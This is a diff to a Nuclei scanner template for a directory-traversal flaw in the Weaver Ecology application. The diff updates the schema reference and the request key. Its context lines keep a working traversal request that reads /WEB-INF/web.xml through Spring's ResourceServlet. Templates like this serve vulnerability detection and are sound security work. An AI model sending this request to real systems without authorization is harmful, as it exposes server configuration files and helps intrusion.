@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ecology-springframework-directory-traversal
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: medium
   tags: ecology,springframework,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml"
